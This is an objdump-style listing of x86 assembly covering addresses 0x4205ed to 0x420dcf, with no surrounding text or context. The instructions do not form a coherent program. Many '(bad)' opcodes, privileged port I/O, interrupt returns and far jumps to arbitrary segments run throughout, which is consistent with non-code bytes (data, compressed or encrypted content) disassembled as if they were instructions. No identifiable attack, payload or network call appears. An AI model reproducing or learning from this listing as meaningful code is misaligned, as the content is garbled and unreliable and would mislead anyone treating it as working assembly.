  4205ed:	inc    eax
  4205ee:	mov    ah,0xd8
  4205f0:	mov    bh,0x37
  4205f2:	or     ah,ch
  4205f4:	pop    ebx
  4205f5:	adc    al,0x5
  4205f7:	div    DWORD PTR [ebx+0x370ee1e6]
  4205fd:	jo     0x4205b2
  4205ff:	inc    esp
  420600:	jg     0x420635
  420602:	iret   
  420603:	(bad)  
  420604:	xor    DWORD PTR [ebx+0x58],esp
  420607:	jge    0x420602
  420609:	(bad)  
  42060a:	dec    edx
  42060b:	clc    
  42060c:	lds    esp,FWORD PTR [eax+0x53]
  42060f:	lahf   
  420610:	ret    
  420611:	dec    edi
  420612:	push   ss
  420613:	xchg   esi,eax
  420614:	add    eax,0x80c4c798
  420619:	in     al,0xe9
  42061b:	in     al,dx
  42061c:	xchg   edi,eax
  42061d:	cmc    
  42061e:	pop    ebp
  42061f:	(bad)  
  420620:	pop    esp
  420621:	fidiv  DWORD PTR [ebp-0x671cb977]
  420627:	mov    edx,cs
  420629:	and    DWORD PTR [edx-0x1024b7c],esi
  42062f:	dec    eax
  420630:	sbb    BYTE PTR [edx+edx*8+0x46],ah
  420634:	es sub eax,0xf138941
  42063a:	mov    eax,ds:0xc6a4536e
  42063f:	pop    ss
  420640:	dec    eax
  420641:	dec    ebp
  420642:	not    ebp
  420644:	pop    ebx
  420645:	jmp    0x325a:0x32e1abe8
  42064c:	and    al,BYTE PTR [esi]
  42064e:	jnp    0x42061e
  420650:	mov    bh,0x8a
  420652:	mov    edx,0xa4faec53
  420657:	lahf   
  420658:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  420659:	mov    ah,0x6f
  42065b:	add    eax,0x972be9be
  420660:	lods   eax,DWORD PTR ds:[esi]
  420661:	(bad)  
  420662:	aam    0x35
  420664:	push   edi
  420665:	shr    BYTE PTR [edx+0x37],0x2a
  420669:	mov    eax,0x65ea5bf4
  42066e:	imul   edi,DWORD PTR cs:[eax+0x10],0x604e3d15
  420676:	in     al,0xef
  420678:	adc    eax,0x9fae02e6
  42067d:	dec    ecx
  42067e:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42067f:	pop    edi
  420680:	inc    edx
  420681:	add    DWORD PTR ds:0xfcae0d6c,0xfffffff4
  420688:	pop    ds
  420689:	aas    
  42068a:	ins    BYTE PTR es:[edi],dx
  42068b:	into   
  42068c:	and    eax,0x2bef8efc
  420691:	dec    edi
  420692:	test   DWORD PTR [ebx-0x57],eax
  420695:	lds    ecx,FWORD PTR [edx+0x4b9d9b38]
  42069b:	sbb    al,0x8b
  42069d:	adc    edi,edi
  42069f:	adc    al,0xf3
  4206a1:	xchg   edi,eax
  4206a2:	lods   eax,DWORD PTR ds:[esi]
  4206a3:	push   ecx
  4206a4:	cmp    esp,DWORD PTR [ecx-0x36]
  4206a7:	mov    ah,0xeb
  4206a9:	sbb    edi,DWORD PTR [edi-0x60]
  4206ac:	(bad)  [eiz*1-0x7704f516]
  4206b3:	jb     0x420707
  4206b5:	add    ebx,DWORD PTR ds:0xca227c6
  4206bb:	sub    eax,0x453bdbb
  4206c0:	out    0xf3,eax
  4206c2:	adc    DWORD PTR [edx-0x71acad1a],0x6a
  4206c9:	dec    ebx
  4206ca:	sub    BYTE PTR [esi],0x56
  4206cd:	xor    eax,0x4fe29599
  4206d2:	stos   DWORD PTR es:[edi],eax
  4206d3:	sub    DWORD PTR [esi+0x37],esp
  4206d6:	mov    DWORD PTR [ebx-0x40],esp
  4206d9:	out    dx,al
  4206da:	call   0x158912c7
  4206df:	jne    0x420737
  4206e1:	xor    DWORD PTR [ebx+0x30],0x33b871b6
  4206e8:	shl    BYTE PTR [ebp+0x4b],1
  4206eb:	mov    bl,0xd9
  4206ed:	into   
  4206ee:	mov    bh,0x12
  4206f0:	stos   DWORD PTR es:[edi],eax
  4206f1:	jmp    0x420754
  4206f3:	ficom  DWORD PTR [ebp+0x23]
  4206f6:	(bad)  
  4206f7:	mov    dl,0x7f
  4206f9:	mov    ebp,0x4d9a9f1e
  4206fe:	imul   edx,DWORD PTR [edx-0x5a],0xffffffa1
  420702:	ret    
  420703:	push   edi
  420704:	std    
  420705:	or     al,0xa
  420707:	sbb    bh,BYTE PTR [ecx+0x27]
  42070a:	fldz   
  42070c:	clc    
  42070d:	fisttp WORD PTR [edi]
  42070f:	and    edx,edx
  420711:	sub    bh,BYTE PTR [eax+edi*8+0x76aa7bea]
  420718:	sbb    al,0xcc
  42071a:	gs out dx,al
  42071c:	and    eax,0xbba96267
  420721:	in     eax,dx
  420722:	mov    ecx,0x8aac4513
  420727:	fstp   st(4)
  420729:	cs pusha 
  42072b:	mov    dl,0x31
  42072d:	mov    esi,0x380a4e95
  420732:	fbld   TBYTE PTR [eax+0x5f]
  420735:	int3   
  420736:	xchg   edx,eax
  420737:	pusha  
  420738:	xlat   BYTE PTR ds:[ebx]
  420739:	and    al,0x13
  42073b:	jl     0x420785
  42073d:	push   esi
  42073e:	fucompp 
  420740:	adc    DWORD PTR [eax+0x57],ebp
  420743:	add    eax,0x2ae04313
  420748:	(bad)  
  420749:	pop    edx
  42074a:	sbb    eax,0x53747c1b
  42074f:	cmp    al,0x48
  420751:	neg    DWORD PTR [ebp+ebp*1-0x57]
  420755:	pusha  
  420756:	cmp    ebp,edx
  420758:	in     eax,0x8d
  42075a:	mov    eax,0xe5ca74f0
  42075f:	lahf   
  420760:	jbe    0x4207da
  420762:	shl    BYTE PTR [ecx+0x190dbdb4],cl
  420768:	jg     0x4206f1
  42076a:	loop   0x420742
  42076c:	iret   
  42076d:	shl    BYTE PTR [ecx-0x3bea5670],1
  420773:	dec    edx
  420774:	inc    ecx
  420775:	cmp    eax,0xf300dec1
  42077a:	xor    edi,ebx
  42077c:	repnz pop edi
  42077e:	outs   dx,BYTE PTR ds:[esi]
  42077f:	dec    edx
  420780:	pop    ss
  420781:	dec    eax
  420782:	cmp    ebp,DWORD PTR [eax+0x35]
  420785:	repz sahf 
  420787:	mov    ebp,0x9aad7fc2
  42078c:	xchg   ebx,eax
  42078d:	stos   BYTE PTR es:[edi],al
  42078e:	or     eax,0x5b8ffd36
  420793:	js     0x42080e
  420795:	xor    BYTE PTR [ebx-0x2d],0xb4
  420799:	pop    ecx
  42079a:	jle    0x4207ea
  42079c:	add    al,0x60
  42079e:	fnstcw WORD PTR [esi+0x3e7a3ed4]
  4207a4:	add    DWORD PTR [edi+0x744dd46d],eax
  4207aa:	and    DWORD PTR [eax],ebx
  4207ac:	outs   dx,BYTE PTR ds:[esi]
  4207ad:	imul   ebp,edi,0xd5a5afe6
  4207b3:	mov    ecx,0xf0f1e665
  4207b8:	test   BYTE PTR [eax+0x19],bl
  4207bb:	imul   ebx,DWORD PTR [esi+0x56e37d9d],0xc
  4207c2:	push   0x4d
  4207c4:	jle    0x420803
  4207c6:	dec    ebp
  4207c7:	hlt    
  4207c8:	push   cs
  4207c9:	and    al,0x91
  4207cb:	xchg   BYTE PTR [esi],dh
  4207cd:	cmp    DWORD PTR [eax],edx
  4207cf:	retf   
  4207d0:	jns    0x4207f2
  4207d2:	retf   
  4207d3:	push   edi
  4207d4:	push   0x28
  4207d6:	ret    
  4207d7:	std    
  4207d8:	jno    0x4207b8
  4207da:	imul   esp,DWORD PTR [eax+0x3f6145ad],0xd2c0e2ef
  4207e4:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4207e5:	sub    eax,0x769d7ede
  4207ea:	mov    esp,0xa7a185f
  4207ef:	das    
  4207f0:	fidiv  DWORD PTR [eax-0x31dbfff8]
  4207f6:	aaa    
  4207f7:	xor    DWORD PTR [ebp-0x27],edi
  4207fa:	xor    DWORD PTR [edi],0xe59ad9b5
  420800:	clc    
  420801:	or     cl,BYTE PTR [ecx-0x3b5031ef]
  420807:	push   ss
  420808:	int3   
  420809:	lock or DWORD PTR fs:[ecx],edx
  42080d:	jnp    0x4207a8
  42080f:	pop    ds
  420810:	add    ebp,ecx
  420812:	inc    edx
  420813:	in     eax,0x3c
  420815:	std    
  420816:	or     DWORD PTR [esi],ebp
  420818:	xor    eax,edi
  42081a:	out    0x12,eax
  42081c:	xchg   edx,eax
  42081d:	adc    BYTE PTR [edx+ebp*2],bh
  420820:	in     al,0x33
  420822:	call   0xcd628e4d
  420827:	dec    ecx
  420828:	aad    0xbf
  42082a:	inc    esp
  42082b:	dec    ebp
  42082c:	dec    edx
  42082d:	dec    ebx
  42082e:	dec    ebx
  42082f:	dec    edi
  420830:	inc    ebp
  420831:	dec    edi
  420832:	sub    eax,0xa104921e
  420837:	push   es
  420838:	sbb    ah,BYTE PTR [eax+esi*2-0x77fffe69]
  42083f:	push   es
  420840:	add    BYTE PTR [eax],al
  420842:	cdq    
  420843:	xchg   edi,eax
  420844:	bound  ecx,QWORD PTR [edx-0x2]
  420847:	jecxz  0x420848
  420849:	sahf   
  42084a:	mov    al,0x8b
  42084c:	mov    cl,ah
  42084e:	pusha  
  42084f:	shl    esp,0x63
  420852:	les    ebp,FWORD PTR [edi-0x42]
  420855:	push   0xc9ef6836
  42085a:	jge    0x4208a2
  42085c:	addr16 das 
  42085e:	data16 and dl,ah
  420861:	jecxz  0x420871
  420863:	cmp    edi,DWORD PTR [ebx+0x4a]
  420866:	adc    BYTE PTR ss:[di-0x6f],dh
  42086b:	movd   mm3,eax
  42086e:	push   edi
  42086f:	jmp    0x42085b
  420871:	push   es
  420872:	addr16 pop ss
  420874:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  420875:	enter  0x1bcc,0x6a
  420879:	ss sub ecx,0xbecc45de
  420880:	in     eax,dx
  420881:	jno    0x4208cb
  420883:	push   edx
  420884:	push   0xffffffef
  420886:	mov    ebx,0xa2ec9071
  42088b:	inc    BYTE PTR [ebx-0x60]
  42088e:	cmp    eax,0x8bc30002
  420893:	sbb    ah,dh
  420895:	adc    ebx,DWORD PTR [edx-0x79]
  420898:	das    
  420899:	dec    esi
  42089a:	mov    ah,0x77
  42089c:	mov    bl,0x83
  42089e:	cmc    
  42089f:	inc    DWORD PTR [ebp+0x7dd6a544]
  4208a5:	into   
  4208a6:	xchg   BYTE PTR [ecx+esi*8+0x429de7be],ah
  4208ad:	cmp    al,0xff
  4208af:	inc    ebp
  4208b0:	sbb    edx,DWORD PTR [eax+0x31]
  4208b3:	cmp    BYTE PTR [edx+0x6d],al
  4208b6:	add    bl,0x78
  4208b9:	jmp    0x81c3:0xe6e1c4b9
  4208c0:	scas   eax,DWORD PTR es:[edi]
  4208c1:	sar    DWORD PTR [edi],1
  4208c3:	imul   edi,DWORD PTR [ebx-0x28538cf6],0xd28980e9
  4208cd:	push   esi
  4208ce:	fmul   st(1),st
  4208d0:	sub    bh,BYTE PTR [edx+0x57]
  4208d3:	jae    0x420903
  4208d5:	pop    esi
  4208d6:	pushf  
  4208d7:	pop    esi
  4208d8:	inc    edx
  4208d9:	int    0x82
  4208db:	int    0xe
  4208dd:	std    
  4208de:	loope  0x42086d
  4208e0:	sub    edx,DWORD PTR [ebx+ecx*8-0x4d43ed19]
  4208e7:	retf   0x3d1c
  4208ea:	adc    BYTE PTR [ecx],0x1a
  4208ed:	push   ds
  4208ee:	or     eax,0xe5522cd3
  4208f3:	jbe    0x4208fa
  4208f5:	xchg   BYTE PTR [edx-0x1c],dh
  4208f8:	or     al,0xf4
  4208fa:	iret   
  4208fb:	xchg   edi,eax
  4208fc:	inc    esp
  4208fd:	xor    dl,BYTE PTR [esi]
  4208ff:	pop    ebp
  420900:	mov    ah,0xc8
  420902:	ret    0xd332
  420905:	mov    ebp,0x406bee31
  42090a:	cwde   
  42090b:	fmul   DWORD PTR [ebx+ecx*8]
  42090e:	sbb    BYTE PTR ds:0xf8e22ff2,0xac
  420915:	mov    edx,0x80aea86
  42091a:	dec    ebx
  42091b:	sbb    esp,DWORD PTR [esi]
  42091d:	cmp    eax,DWORD PTR [eax]
  42091f:	mov    dh,0x87
  420921:	data16 ss (bad) 
  420924:	and    BYTE PTR [ecx],bl
  420926:	or     BYTE PTR [edi+0x27953bfb],al
  42092c:	int    0x14
  42092e:	test   DWORD PTR [ebp-0x4c],ebp
  420931:	mov    dh,0x0
  420933:	inc    edx
  420934:	iret   
  420935:	pop    eax
  420936:	or     DWORD PTR [edx-0x7d],esp
  420939:	scas   eax,DWORD PTR es:[edi]
  42093a:	movq   QWORD PTR [esi-0x38],mm6
  42093e:	outs   dx,BYTE PTR ds:[esi]
  42093f:	test   eax,0xf3aaf7d
  420944:	sub    ebx,esi
  420946:	fidiv  WORD PTR [ebp-0x14b185fb]
  42094c:	xor    ch,BYTE PTR [ecx]
  42094e:	push   0xd40fa1c4
  420953:	push   ebp
  420954:	fild   DWORD PTR ds:0x660f390f
  42095a:	out    dx,al
  42095b:	dec    esp
  42095c:	gs ss icebp 
  42095f:	mov    ds:0xc41099d,al
  420964:	cmp    al,0xf
  420966:	adc    al,BYTE PTR [edi+esi*8+0x9999ed]
  42096d:	in     al,0xd3
  42096f:	popf   
  420970:	clc    
  420971:	mov    ebp,0xd299fa23
  420976:	mov    dl,ch
  420978:	push   es
  420979:	sbb    DWORD PTR [edx],ebp
  42097b:	std    
  42097c:	stos   BYTE PTR es:[edi],al
  42097d:	ins    BYTE PTR es:[edi],dx
  42097e:	outs   dx,BYTE PTR ds:[esi]
  42097f:	into   
  420980:	lods   eax,DWORD PTR ds:[esi]
  420981:	dec    ecx
  420982:	out    0x78,eax
  420984:	jmp    0xfad6:0x3b42da28
  42098b:	jge    0x420956
  42098d:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42098e:	and    eax,0x2ab99db4
  420993:	leave  
  420994:	sub    al,0x16
  420996:	xor    DWORD PTR [ecx-0x3dbc3f5f],ebx
  42099c:	push   esp
  42099d:	or     eax,0xc0d8ec4b
  4209a2:	jecxz  0x4209d8
  4209a4:	xor    DWORD PTR [ebx+0x2eaafa5c],ebx
  4209aa:	pop    ss
  4209ab:	mov    eax,0xce4274ba
  4209b0:	cli    
  4209b1:	inc    edi
  4209b2:	mov    edx,0x9831931
  4209b7:	jb     0x42097e
  4209b9:	mov    esi,0x1b633c19
  4209be:	and    esp,DWORD PTR [eax-0x40]
  4209c1:	jmp    0x420969
  4209c3:	adc    eax,0x2338b4e4
  4209c8:	out    0x3c,al
  4209ca:	in     eax,dx
  4209cb:	jno    0x420a01
  4209cd:	mov    ds:0x3de3f686,al
  4209d2:	icebp  
  4209d3:	(bad)  
  4209d4:	jmp    0xa0be:0xcf1214c9
  4209db:	or     ebp,DWORD PTR [eax]
  4209dd:	mov    esi,0x79103f7b
  4209e2:	addr16 mov edi,0xa6f07ea0
  4209e8:	mov    ds:0xc1794ff1,al
  4209ed:	rcl    DWORD PTR [ecx-0x3354bcd],0x9b
  4209f4:	test   al,0x6c
  4209f6:	add    eax,0xb6fe907c
  4209fb:	(bad)  [eax-0x2f]
  4209fe:	mov    bl,0xdd
  420a00:	and    eax,0xea8364af
  420a05:	adc    BYTE PTR [edx],0x79
  420a08:	int    0x88
  420a0a:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  420a0b:	adc    DWORD PTR [edi],ecx
  420a0d:	and    al,0x13
  420a0f:	aad    0x46
  420a11:	dec    esi
  420a12:	loope  0x4209c7
  420a14:	imul   eax,edi,0xfffffff3
  420a17:	pop    ds
  420a18:	fistp  DWORD PTR [edx]
  420a1a:	adc    ebx,edx
  420a1c:	mov    eax,0x1a5dec45
  420a21:	pop    ds
  420a22:	xlat   BYTE PTR ds:[ebx]
  420a23:	ins    DWORD PTR es:[edi],dx
  420a24:	imul   esp,DWORD PTR [ebp+0x36dec2af],0xb1742830
  420a2e:	scas   eax,DWORD PTR es:[edi]
  420a2f:	neg    BYTE PTR [eax-0x4d283811]
  420a35:	imul   ecx,ebx,0xcd7e66e4
  420a3b:	shr    BYTE PTR [ecx-0x3f46b1a9],cl
  420a41:	bswap  eax
  420a43:	and    bl,bl
  420a45:	xlat   BYTE PTR ds:[ebx]
  420a46:	mov    cl,0x32
  420a48:	mov    cl,0x99
  420a4a:	(bad)  
  420a4b:	xor    al,0xcb
  420a4d:	push   eax
  420a4e:	(bad)  
  420a50:	mov    al,ds:0xf15da78c
  420a55:	cld    
  420a56:	cwde   
  420a57:	sbb    al,0x74
  420a59:	in     al,0xc8
  420a5b:	mov    ebp,0x62b658c4
  420a60:	(bad)  
  420a61:	mov    ?,WORD PTR [edi+ebx*4+0x4c0062b4]
  420a68:	imul   BYTE PTR [ecx]
  420a6a:	cmp    ch,dl
  420a6c:	xchg   ebx,eax
  420a6d:	std    
  420a6e:	ret    0x32f7
  420a71:	sbb    eax,0xd4a7fae8
  420a76:	cwde   
  420a77:	fldenv [ebx-0x32484734]
  420a7d:	mov    eax,0x2f4ff587
  420a82:	or     al,0xa
  420a84:	into   
  420a85:	sub    eax,0x8984a0ee
  420a8a:	and    ebp,esi
  420a8c:	xor    ebx,DWORD PTR [eax+0x155cc5d]
  420a92:	adc    edi,DWORD PTR [ecx-0x4b]
  420a95:	stos   DWORD PTR es:[edi],eax
  420a96:	add    al,0x90
  420a98:	scas   al,BYTE PTR es:[edi]
  420a99:	and    al,0x2d
  420a9b:	jmp    0x90d4:0x3baf6bd7
  420aa2:	inc    esi
  420aa3:	sti    
  420aa4:	inc    esi
  420aa5:	jno    0x420b13
  420aa7:	xor    BYTE PTR [ebp*2-0x7d06b337],dh
  420aae:	call   0x60b8a0a1
  420ab3:	push   0x8d056999
  420ab8:	stos   DWORD PTR es:[edi],eax
  420ab9:	enter  0x6a47,0x7f
  420abd:	inc    eax
  420abe:	iret   
  420abf:	push   edi
  420ac0:	mov    dh,0xc5
  420ac2:	retf   0xf9af
  420ac5:	push   esi
  420ac6:	setp   BYTE PTR [ebp-0x5a]
  420aca:	sar    BYTE PTR [ebx+edx*4-0x34],cl
  420ace:	aad    0x11
  420ad0:	adc    al,0x1c
  420ad2:	dec    esi
  420ad3:	xor    al,0x5d
  420ad5:	cmp    eax,0x252b5e33
  420ada:	mov    eax,0xb6e17b0d
  420adf:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  420ae0:	cld    
  420ae1:	push   ecx
  420ae2:	mov    bh,0x9c
  420ae4:	xor    al,0xe3
  420ae6:	mov    ds:0x1a8c948e,eax
  420aeb:	mov    bh,0xa
  420aed:	xor    BYTE PTR [edx+0x2aae53e],cl
  420af3:	pop    es
  420af4:	pop    es
  420af5:	sbb    dl,cl
  420af7:	xor    DWORD PTR [ebx-0x6f80e65a],edi
  420afd:	jp     0x420a88
  420aff:	adc    ch,BYTE PTR [edi]
  420b01:	add    DWORD PTR ds:0x3f3966b6,ebp
  420b07:	icebp  
  420b08:	push   0xfffffff9
  420b0a:	pop    eax
  420b0b:	int3   
  420b0c:	call   0xb9d0:0xf2547f1a
  420b13:	js     0x420b20
  420b15:	add    dh,bh
  420b17:	pop    edx
  420b18:	out    dx,eax
  420b19:	mov    al,ds:0x8e905a71
  420b1e:	sbb    al,0x3c
  420b20:	cmp    edi,DWORD PTR ds:0x54f5f86d
  420b26:	idiv   DWORD PTR [edx+0x2a634983]
  420b2c:	or     ebx,DWORD PTR [ebp-0x6d]
  420b2f:	sub    DWORD PTR [ecx+0x200a786d],0x4d
  420b36:	xor    eax,0x4ad7c63
  420b3b:	stos   BYTE PTR es:[edi],al
  420b3c:	mov    ch,0x90
  420b3e:	and    DWORD PTR [ebx],edx
  420b40:	(bad)  
  420b42:	dec    ecx
  420b43:	pop    eax
  420b44:	mov    dh,BYTE PTR [esi-0x619f236f]
  420b4a:	loopne 0x420bb9
  420b4c:	xchg   edi,eax
  420b4d:	std    
  420b4e:	mov    cl,0x2a
  420b50:	inc    edi
  420b51:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  420b52:	xor    al,0xfd
  420b54:	mov    WORD PTR [ebp+0x5e],fs
  420b57:	rcr    BYTE PTR [edi+0x32],1
  420b5a:	stos   DWORD PTR es:[edi],eax
  420b5b:	(bad)  
  420b5c:	fnstsw WORD PTR [esi+esi*8-0x75fbe6a7]
  420b63:	adc    DWORD PTR [ebp-0x67234f84],ebp
  420b69:	pop    esi
  420b6a:	jo     0x420b1c
  420b6c:	inc    edi
  420b6d:	push   ebx
  420b6e:	jne    0x420bca
  420b70:	mov    cl,0xeb
  420b72:	or     edi,DWORD PTR [eax+0xc0982b6]
  420b78:	daa    
  420b79:	mov    cl,0xce
  420b7b:	mov    esp,0x768d894e
  420b80:	test   eax,0xbb18a1f
  420b85:	not    DWORD PTR [ecx-0x3ab6469]
  420b8b:	in     al,0xd8
  420b8d:	inc    esp
  420b8e:	test   al,0x74
  420b90:	int    0xd3
  420b92:	pop    edi
  420b93:	mov    ?,WORD PTR [edi-0xec28d0d]
  420b99:	div    esp
  420b9b:	pop    edx
  420b9c:	clc    
  420b9d:	mov    ah,0xf6
  420b9f:	mov    ds:0xd28a10a3,al
  420ba4:	in     eax,0x6c
  420ba6:	outs   dx,BYTE PTR ds:[esi]
  420ba7:	popa   
  420ba8:	shl    BYTE PTR [esp+eiz*4-0x373d6a3f],1
  420baf:	sub    DWORD PTR [ebp+eiz*4+0x3f84d2d6],esp
  420bb6:	add    BYTE PTR [ecx],dh
  420bb8:	shr    BYTE PTR [edx-0x6b916628],0x32
  420bbf:	outs   dx,DWORD PTR ds:[esi]
  420bc0:	aam    0x8c
  420bc2:	(bad)  
  420bc3:	lods   eax,DWORD PTR ds:[esi]
  420bc4:	scas   eax,DWORD PTR es:[edi]
  420bc5:	call   0xe6180715
  420bca:	pop    esp
  420bcb:	(bad)  
  420bcc:	ror    BYTE PTR [edx+0x50],1
  420bcf:	dec    esi
  420bd0:	std    
  420bd1:	jmp    0x1229ddf1
  420bd6:	push   edx
  420bd7:	or     eax,0x2841b2cc
  420bdc:	dec    esi
  420bdd:	xchg   ebx,eax
  420bde:	xchg   BYTE PTR [ebp+0x41],ch
  420be1:	shl    DWORD PTR [ebp+0x45],1
  420be4:	mov    dl,0x28
  420be6:	loopne 0x420c04
  420be8:	xchg   edi,eax
  420be9:	(bad)  
  420beb:	dec    esi
  420bec:	popf   
  420bed:	ret    
  420bee:	mov    ds,WORD PTR [edx-0x77367d48]
  420bf4:	arpl   WORD PTR [ebx],cx
  420bf6:	pop    eax
  420bf7:	sub    DWORD PTR [esi-0x69d451d3],edi
  420bfd:	jle    0x420c49
  420bff:	mov    eax,0xeee0bf1f
  420c04:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  420c05:	ins    DWORD PTR es:[edi],dx
  420c06:	or     BYTE PTR [edx+0x34353f3e],0x98
  420c0d:	mov    bl,0x9a
  420c0f:	inc    edi
  420c10:	aam    0x22
  420c12:	push   edx
  420c13:	imul   edx,ecx,0xf
  420c16:	xor    esi,DWORD PTR [edi+eiz*4-0x69]
  420c1a:	mov    dh,BYTE PTR [esi+0x5a]
  420c1d:	int    0x6a
  420c1f:	and    BYTE PTR [edi],0x2f
  420c22:	sbb    al,0xd3
  420c24:	(bad)  
  420c25:	mov    ds:0x991211ef,al
  420c2a:	cmp    edi,ebx
  420c2c:	and    al,0x77
  420c2e:	adc    eax,0xa52f4c36
  420c33:	push   ss
  420c34:	fistp  QWORD PTR [ebp-0x3e]
  420c37:	push   ds
  420c38:	hlt    
  420c39:	and    bh,bl
  420c3b:	mov    ch,0x45
  420c3d:	mov    ebx,DWORD PTR [esi]
  420c3f:	enter  0xa4f0,0xbb
  420c43:	and    esi,DWORD PTR [eax-0x794fac4f]
  420c49:	push   0xffffff83
  420c4b:	(bad)  
  420c4c:	pop    esi
  420c4d:	push   ebx
  420c4e:	cmp    al,0x86
  420c50:	pop    ss
  420c51:	lods   eax,DWORD PTR ds:[esi]
  420c52:	pusha  
  420c53:	mov    edi,DWORD PTR [edx]
  420c55:	jnp    0x420bec
  420c57:	lahf   
  420c58:	xchg   ecx,eax
  420c59:	sti    
  420c5a:	div    BYTE PTR [esi+0xc63ed38]
  420c60:	sbb    dl,al
  420c62:	cmp    al,0x37
  420c64:	push   ss
  420c65:	and    DWORD PTR [eax+eax*4-0x5d232323],0xb06c2a79
  420c70:	out    0x8f,al
  420c72:	scas   al,BYTE PTR es:[edi]
  420c73:	xchg   ebp,eax
  420c74:	sub    ch,0x94
  420c77:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  420c78:	not    BYTE PTR fs:[ebp+0x484ae9fe]
  420c7f:	push   0xf7913c69
  420c84:	pop    edi
  420c85:	inc    edi
  420c86:	je     0x420c21
  420c88:	pop    esp
  420c89:	sti    
  420c8a:	aad    0x9e
  420c8c:	dec    edx
  420c8d:	scas   eax,DWORD PTR es:[edi]
  420c8e:	xchg   esi,eax
  420c8f:	das    
  420c90:	fild   WORD PTR [ebx-0x5f]
  420c93:	pushf  
  420c94:	xchg   edi,eax
  420c95:	mov    al,BYTE PTR [edx+0x28]
  420c98:	cmp    BYTE PTR [ebx+eiz*8-0x6194e5db],bh
  420c9f:	or     BYTE PTR [eax+0x5e6815c6],0x9f
  420ca6:	(bad)  
  420ca8:	cld    
  420ca9:	dec    ebp
  420caa:	jmp    0xe6030483
  420caf:	les    ebx,FWORD PTR gs:[edi-0x39]
  420cb3:	lea    edi,[eax+0x7d]
  420cb6:	(bad)  
  420cb7:	hlt    
  420cb8:	pop    ebx
  420cb9:	sbb    ebp,DWORD PTR [eax+0x311bf10]
  420cbf:	mov    ?,WORD PTR [ebx+eiz*8+0x73]
  420cc3:	sub    al,0x6d
  420cc5:	daa    
  420cc6:	daa    
  420cc7:	push   esp
  420cc8:	mov    dh,0xb8
  420cca:	(bad)  
  420ccb:	sbb    eax,0xa75bdef2
  420cd0:	call   0x22cf:0x7beea31d
  420cd7:	and    eax,0x47026ada
  420cdc:	(bad)  
  420cde:	jae    0x4386902f
  420ce4:	cld    
  420ce5:	and    al,BYTE PTR [eax]
  420ce7:	(bad)  
  420ce8:	jl     0x420cd3
  420cea:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  420ceb:	mov    BYTE PTR [edx+0x2c],ah
  420cee:	sub    al,0xf7
  420cf0:	and    eax,0xaf1e64bf
  420cf5:	js     0x420d75
  420cf7:	loop   0x420d32
  420cf9:	dec    ecx
  420cfa:	sbb    ah,dl
  420cfc:	jmp    0x6b690ee7
  420d01:	sub    ebp,DWORD PTR [eax]
  420d03:	adc    esi,edx
  420d05:	pop    esi
  420d06:	arpl   WORD PTR [ebx+0x698587ce],si
  420d0c:	sub    BYTE PTR [esi-0x4c],al
  420d0f:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  420d10:	loope  0x420cf1
  420d12:	data16 aam 0xa3
  420d15:	xchg   ecx,eax
  420d16:	in     eax,0x29
  420d18:	rcl    bl,1
  420d1a:	jb     0x420cdb
  420d1c:	or     DWORD PTR [eax+0x23],edi
  420d1f:	aam    0x8a
  420d21:	pop    ecx
  420d22:	imul   BYTE PTR [esi]
  420d24:	mov    al,0xdd
  420d26:	popa   
  420d27:	aam    0xa7
  420d29:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  420d2a:	sbb    dl,BYTE PTR [ebp+0x59]
  420d2d:	out    dx,eax
  420d2e:	mov    bl,BYTE PTR [ecx]
  420d30:	sub    eax,0x7a2bc4b3
  420d35:	popf   
  420d36:	rcr    DWORD PTR [edi],1
  420d38:	xchg   ecx,eax
  420d39:	les    ebp,FWORD PTR [ebx+0x7a]
  420d3c:	cli    
  420d3d:	add    BYTE PTR ds:0x9f83,al
  420d42:	mov    BYTE PTR [eax],ch
  420d44:	mov    al,0xed
  420d46:	or     cl,BYTE PTR [ecx+0x3e]
  420d49:	out    0x3a,eax
  420d4b:	std    
  420d4c:	sub    esp,DWORD PTR [ebx]
  420d4e:	dec    ebp
  420d4f:	retf   0x3c2a
  420d52:	fldenv [ecx-0x3f557bb0]
  420d58:	adc    eax,DWORD PTR [ebp-0x4324f42e]
  420d5e:	mov    ds:0x6e996c9e,al
  420d63:	ficomp DWORD PTR [esi-0x4e]
  420d66:	jmp    0x420d3f
  420d68:	lods   al,BYTE PTR ds:[esi]
  420d69:	into   
  420d6a:	iret   
  420d6b:	cmc    
  420d6c:	(bad)  [eax]
  420d6e:	out    dx,al
  420d6f:	jle    0x420dab
  420d71:	push   edx
  420d72:	xchg   esi,eax
  420d73:	cmp    esp,ebx
  420d75:	std    
  420d76:	xchg   esp,eax
  420d77:	jns    0x420de0
  420d79:	shr    dh,0xa1
  420d7c:	add    edx,esp
  420d7e:	push   0x9ea97518
  420d83:	lock jae 0x420d80
  420d86:	dec    ebp
  420d87:	fist   DWORD PTR [ebx+0x3e]
  420d8a:	sub    DWORD PTR [ebx+0x66a2454],eax
  420d90:	test   al,0xf5
  420d92:	loope  0x420e0e
  420d94:	fs popa 
  420d96:	icebp  
  420d97:	dec    ebp
  420d98:	cld    
  420d99:	xlat   BYTE PTR ds:[ebx]
  420d9a:	pop    ebx
  420d9b:	test   DWORD PTR [esi+0x6871b32d],esi
  420da1:	mov    ds:0x669ebdc0,al
  420da6:	mov    DWORD PTR [esi],edi
  420da8:	sub    BYTE PTR [esi],dh
  420daa:	imul   edx,DWORD PTR [edi-0x3c216bd8],0x12
  420db1:	sbb    BYTE PTR [esi+0x2a11d14e],bh
  420db7:	xor    al,0xa
  420db9:	dec    ebp
  420dba:	adc    eax,0xe10eb820
  420dbf:	add    al,0x29
  420dc1:	mov    dl,0xfc
  420dc3:	adc    al,0x15
  420dc5:	inc    ecx
  420dc6:	je     0x420e26
  420dc8:	sub    bh,bl
  420dca:	xlat   BYTE PTR ds:[ebx]
  420dcb:	push   edi
  420dcc:	add    dh,BYTE PTR [eax-0x62]
  420dcf:	mov    eax,0x70075c82
